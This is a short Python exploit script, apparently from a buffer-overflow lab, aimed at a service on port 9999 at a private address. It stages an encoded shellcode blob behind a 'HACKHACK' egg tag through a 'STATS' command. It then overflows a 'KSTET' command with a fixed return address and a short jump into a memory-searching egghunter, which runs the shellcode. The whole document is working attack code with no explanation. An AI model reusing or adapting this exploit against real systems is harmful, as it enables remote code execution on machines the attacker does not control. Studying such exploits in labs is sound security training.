import socket
import struct



egghunter = [
b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74",
b"\xef\xb8\x48\x41\x43\x4b\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
]
egghunter = b"".join(egghunter)


buf =  b""
buf += b"\xdb\xc4\xbb\xb2\x2d\x1d\x47\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x70\x29\xff"
buf += b"\xb2\x88\xda\x7d\x3c\x70\x1b\xe2\xb4\x95\x2a\x22\xa2"
buf += b"\xde\x1d\x92\xa0\xb2\x91\x59\xe4\x26\x21\x2f\x21\x49"
buf += b"\x82\x9a\x17\x64\x13\xb6\x64\xe7\x97\xc5\xb8\xc7\xa6"
buf += b"\x05\xcd\x06\xee\x78\x3c\x5a\xa7\xf7\x93\x4a\xcc\x42"
buf += b"\x28\xe1\x9e\x43\x28\x16\x56\x65\x19\x89\xec\x3c\xb9"
buf += b"\x28\x20\x35\xf0\x32\x25\x70\x4a\xc9\x9d\x0e\x4d\x1b"
buf += b"\xec\xef\xe2\x62\xc0\x1d\xfa\xa3\xe7\xfd\x89\xdd\x1b"
buf += b"\x83\x89\x1a\x61\x5f\x1f\xb8\xc1\x14\x87\x64\xf3\xf9"
buf += b"\x5e\xef\xff\xb6\x15\xb7\xe3\x49\xf9\xcc\x18\xc1\xfc"
buf += b"\x02\xa9\x91\xda\x86\xf1\x42\x42\x9f\x5f\x24\x7b\xff"
buf += b"\x3f\x99\xd9\x74\xad\xce\x53\xd7\xba\x23\x5e\xe7\x3a"
buf += b"\x2c\xe9\x94\x08\xf3\x41\x32\x21\x7c\x4c\xc5\x46\x57"
buf += b"\x28\x59\xb9\x58\x49\x70\x7e\x0c\x19\xea\x57\x2d\xf2"
buf += b"\xea\x58\xf8\x55\xba\xf6\x53\x16\x6a\xb7\x03\xfe\x60"
buf += b"\x38\x7b\x1e\x8b\x92\x14\xb5\x76\x75\x11\x4c\x4f\xaf"
buf += b"\x4d\x52\xaf\xbe\xd6\xdb\x49\xaa\xf8\x8d\xc2\x43\x60"
buf += b"\x94\x98\xf2\x6d\x02\xe5\x35\xe5\xa1\x1a\xfb\x0e\xcf"
buf += b"\x08\x6c\xff\x9a\x72\x3b\x00\x31\x1a\xa7\x93\xde\xda"
buf += b"\xae\x8f\x48\x8d\xe7\x7e\x81\x5b\x1a\xd8\x3b\x79\xe7"
buf += b"\xbc\x04\x39\x3c\x7d\x8a\xc0\xb1\x39\xa8\xd2\x0f\xc1"
buf += b"\xf4\x86\xdf\x94\xa2\x70\xa6\x4e\x05\x2a\x70\x3c\xcf"
buf += b"\xba\x05\x0e\xd0\xbc\x09\x5b\xa6\x20\xbb\x32\xff\x5f"
buf += b"\x74\xd3\xf7\x18\x68\x43\xf7\xf3\x28\x73\xb2\x59\x18"
buf += b"\x1c\x1b\x08\x18\x41\x9c\xe7\x5f\x7c\x1f\x0d\x20\x7b"
buf += b"\x3f\x64\x25\xc7\x87\x95\x57\x58\x62\x99\xc4\x59\xa7"

shellcode = buf

s = socket.socket()
s.connect(("10.6.52.78",9999)) 
s.send(b"STATS " + b"HACKHACK" + shellcode)

s = socket.socket()
s.connect(("10.6.52.78",9999))
total_length = 100
offset = 70
new_eip = struct.pack("<I",0x62501203)
short_jump = b"\xeb\xbe" #jump back 64 bytes to the start of the egghunter

buffer = [
    b"A"*10,
    egghunter,
    b"A" * (offset - (len(egghunter)) - 10 ),
    new_eip,
    short_jump,
    b"C" * (total_length - offset - len(new_eip)-len(short_jump)-len(egghunter))
]

buffer = b"".join(buffer)
s.send(b"KSTET " + buffer)

